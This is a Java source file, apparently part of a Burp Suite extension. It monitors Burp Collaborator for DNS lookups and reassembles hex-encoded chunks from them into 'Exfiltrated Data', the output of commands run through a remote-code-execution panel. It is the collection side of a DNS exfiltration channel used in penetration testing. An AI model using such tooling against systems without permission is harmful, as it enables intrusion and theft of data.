package burp;

import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.collaborator.InteractionFilter;
import burp.api.montoya.logging.Logging;
import com.google.common.io.BaseEncoding;

import javax.swing.*;
import java.util.*;

public class RCEMonitoringManager {
    private final CollaboratorClient collaboratorClient;
    private final Logging logging;
    private final RCEPanel rcePanel;
    private Thread monitoringThread;
    private boolean stopMonitoring = false;

    public RCEMonitoringManager(CollaboratorClient collaboratorClient, Logging logging, RCEPanel rcePanel) {
        this.collaboratorClient = collaboratorClient;
        this.logging = logging;
        this.rcePanel = rcePanel;
    }

    public void startMonitoring(String collaboratorPayload) {
        logging.logToOutput("Starting monitoring for collaborator domain: " + collaboratorPayload);
        stopMonitoring = false;
            
        Thread thread = new Thread(() -> {
            Map<String, String> dnsRecordDict = new HashMap<>();
            int sameCounter = 0;
            
            while (!stopMonitoring) {
                try {
                    Thread.sleep(1000);
                    
                    Set<String> oldKeys = new HashSet<>(dnsRecordDict.keySet());
                    logging.logToOutput("Old keys before processing: " + oldKeys);
                    
                    List<Interaction> interactions = collaboratorClient.getInteractions(
                        InteractionFilter.interactionPayloadFilter(collaboratorPayload)
                    );
                    
                    for (Interaction interaction : interactions) {
                        if (!interaction.dnsDetails().isPresent()) {
                            continue;
                        }
                        
                        byte[] queryBytes = interaction.dnsDetails().get().query().getBytes();
                        logging.logToOutput("Processing query with length: " + queryBytes.length);
                        
                        if (queryBytes.length < 19) {
                            continue;
                        }
                        
                        int preambleOffset = queryBytes[12] & 0xFF;
                        int dataChunkOffset = queryBytes[17] & 0xFF;
                        
                        StringBuilder preamble = new StringBuilder();
                        for (int i = 13; i < 13 + preambleOffset; i++) {
                            preamble.append((char)queryBytes[i]);
                        }
                        
                        StringBuilder dataChunk = new StringBuilder();
                        for (int i = 18; i < 18 + dataChunkOffset; i++) {
                            dataChunk.append((char)queryBytes[i]);
                        }
                        
                        logging.logToOutput(String.format("Extracted - Preamble: %s, Data: %s", 
                            preamble.toString(), dataChunk.toString()));
                        
                        dnsRecordDict.put(preamble.toString(), dataChunk.toString());
                    }
                    
                    Set<String> newKeys = dnsRecordDict.keySet();
                    logging.logToOutput("New keys after processing: " + newKeys);
                    
                    if (newKeys.equals(oldKeys) && !newKeys.isEmpty()) {
                        sameCounter++;
                        logging.logToOutput("No new chunks received. Same counter: " + sameCounter);
                    } else if (!newKeys.equals(oldKeys) && !newKeys.isEmpty()) {
                        sameCounter = 0;
                        logging.logToOutput("New chunks detected, resetting counter");
                    }
                    
                    if (sameCounter >= 5) {
                        logging.logToOutput("No new data received for 5 checks, stopping monitoring");
                        stopMonitoring = true;
                    }
                    
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    logging.logToError("Monitoring thread interrupted: " + e.getMessage());
                    break;
                } catch (Exception e) {
                    logging.logToError("Error processing DNS interaction: " + e.getMessage());
                    e.printStackTrace();
                }
            }
            
            SwingUtilities.invokeLater(() -> {
                rcePanel.getRceProgressBar().setIndeterminate(false);
                rcePanel.getRceStopButton().setVisible(false);
                rcePanel.getExecuteButton().setVisible(true);
                if (!dnsRecordDict.isEmpty()) {
                    logging.logToOutput("Final data dictionary contents: " + dnsRecordDict);
                    displayOutput(dnsRecordDict, collaboratorPayload);
                }
            });
        });
        monitoringThread = thread;
        thread.start();
    }

    public void stopMonitoring() {
        stopMonitoring = true;
        if (monitoringThread != null && monitoringThread.isAlive()) {
            monitoringThread.interrupt();
        }
    }

    private void displayOutput(Map<String, String> dnsRecordDict, String collaboratorPayload) {
        StringBuilder output = new StringBuilder();
        
        List<Map.Entry<String, String>> sortedEntries = new ArrayList<>(dnsRecordDict.entrySet());
        Collections.sort(sortedEntries, Map.Entry.comparingByKey());
        
        for (Map.Entry<String, String> entry : sortedEntries) {
            output.append(entry.getValue());
        }
        
        try {
            String result = new String(BaseEncoding.base16().decode(output.toString().toUpperCase()));
            rcePanel.getRceOutputTxt().append("Command: " + rcePanel.getCommandTxt().getText() + "\n");
            rcePanel.getRceOutputTxt().append("Exfiltrated Data:\n" + result + "\n\n");
            
            rcePanel.getRceOutputTxt().setCaretPosition(rcePanel.getRceOutputTxt().getDocument().getLength());
            
            logging.logToOutput("Collaborator Domain: " + collaboratorPayload);
            logging.logToOutput("Command: " + rcePanel.getCommandTxt().getText());
            logging.logToOutput("Output:\n" + result + "\n");
            
        } catch (IllegalArgumentException e) {
            logging.logToError("Error decoding hex output: " + e.getMessage());
        }
    }
}